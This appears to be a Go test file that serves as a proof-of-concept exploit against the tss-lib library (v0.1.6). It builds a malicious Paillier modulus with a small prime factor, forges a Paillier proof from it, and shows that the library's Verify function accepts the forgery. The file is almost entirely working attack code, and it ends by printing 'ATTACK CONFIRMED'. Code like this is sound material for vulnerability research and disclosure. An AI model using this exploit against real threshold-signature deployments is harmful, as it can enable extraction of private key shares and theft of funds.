package tss_real_lib_attack

import (
	"crypto/rand"
	"fmt"
	"math/big"
	"testing"

	"github.com/binance-chain/tss-lib/crypto"
	"github.com/binance-chain/tss-lib/crypto/paillier"
	"github.com/btcsuite/btcd/btcec"
)

func TestMaliciousNAcceptedByRealLib(t *testing.T) {
	fmt.Println("[1] start")
	const qSmallInt = 1009
	qSmall := big.NewInt(qSmallInt)

	// Generate pBig so that N = pBig × 1009 is EXACTLY 1024 bits.
	// 1009 is ~10 bits, so pBig is ~1014 bits. We re-roll until N.BitLen() == 1024.
	var pBig *big.Int
	var N *big.Int
	for attempts := 0; attempts < 50; attempts++ {
		var err2 error
		pBig, err2 = rand.Prime(rand.Reader, 1014)
		if err2 != nil {
			t.Fatal(err2)
		}
		N = new(big.Int).Mul(pBig, qSmall)
		if N.BitLen() == 1024 {
			break
		}
	}
	if N.BitLen() != 1024 {
		t.Fatalf("could not produce 1024-bit N after 50 attempts (got %d bits)", N.BitLen())
	}
	pMinus1 := new(big.Int).Sub(pBig, big.NewInt(1))
	qMinus1 := new(big.Int).Sub(qSmall, big.NewInt(1))
	phiN := new(big.Int).Mul(pMinus1, qMinus1)
	g := new(big.Int).GCD(nil, nil, pMinus1, qMinus1)
	lambdaN := new(big.Int).Div(phiN, g)
	_ = lambdaN

	k := big.NewInt(1)
	curve := btcec.S256()
	privScalar, _ := rand.Int(rand.Reader, curve.N)
	px, py := curve.ScalarBaseMult(privScalar.Bytes())
	ecdsaPub, err := crypto.NewECPoint(curve, px, py)
	if err != nil {
		t.Fatal(err)
	}
	fmt.Println("[2] inputs built, N bits =", N.BitLen())

	fmt.Println("[3] testing ModInverse(N, PhiN)")
	M := new(big.Int).ModInverse(N, phiN)
	if M == nil {
		fmt.Println("    M is NIL — gcd != 1; sk.Proof would crash here")
		return
	}
	fmt.Println("    M bits:", M.BitLen())

	fmt.Println("[4] calling paillier.GenerateXs(13)")
	xs := paillier.GenerateXs(13, k, N, ecdsaPub)
	fmt.Println("    xs len =", len(xs))

	fmt.Println("[5] building proof manually")
	var proof paillier.Proof
	for i := 0; i < 13; i++ {
		proof[i] = new(big.Int).Exp(xs[i], M, N)
	}
	fmt.Println("    proof built")

	fmt.Println("[6] calling proof.Verify (REAL vulnerable lib code)")
	ok, err := proof.Verify(N, k, ecdsaPub)
	if err != nil {
		t.Fatal(err)
	}
	fmt.Printf("[7] Verify returned: %v\n", ok)
	if !ok {
		t.Fatal("vulnerable lib REJECTED malicious N")
	}
	fmt.Println("[8] === ATTACK CONFIRMED AGAINST REAL LIB v0.1.6 ===")
}
